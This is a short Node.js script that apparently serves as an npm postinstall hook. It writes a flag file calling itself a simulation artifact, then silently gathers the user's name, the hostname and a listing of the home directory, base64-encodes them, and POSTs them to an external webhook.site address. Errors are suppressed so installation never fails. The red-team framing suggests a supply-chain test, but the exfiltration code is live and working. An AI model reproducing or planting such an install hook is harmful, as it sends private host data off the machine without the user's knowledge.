const os = require("os");
const fs = require("fs");
const path = require("path");

const listing = fs.readdirSync(os.homedir(), { withFileTypes: true })
  .map(f => f.isDirectory() ? `[DIR] ${f.name}` : `[FILE] ${f.name}`)
  .join('\n');

const flagContent = "SIMULATION_ARTIFACT: This file demonstrates successful execution of a postinstall script.";
const flagPath = path.join(process.cwd(), 'reed_team_flag.txt');

fs.writeFileSync(flagPath, flagContent);

function b64(value) {
  return Buffer.from(value, "utf8").toString("base64");
}

(async () => {
  try {
    await fetch("https://webhook.site/bedaeb16-7ab1-4a43-b5bc-e57be9f82d70", {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({
        event: "postinstall",
        username: b64(os.userInfo().username),
        deviceName: b64(os.hostname()),
        homeDirectory: b64(listing)
      })
    });
  } catch {
    // never block install
  }
})();
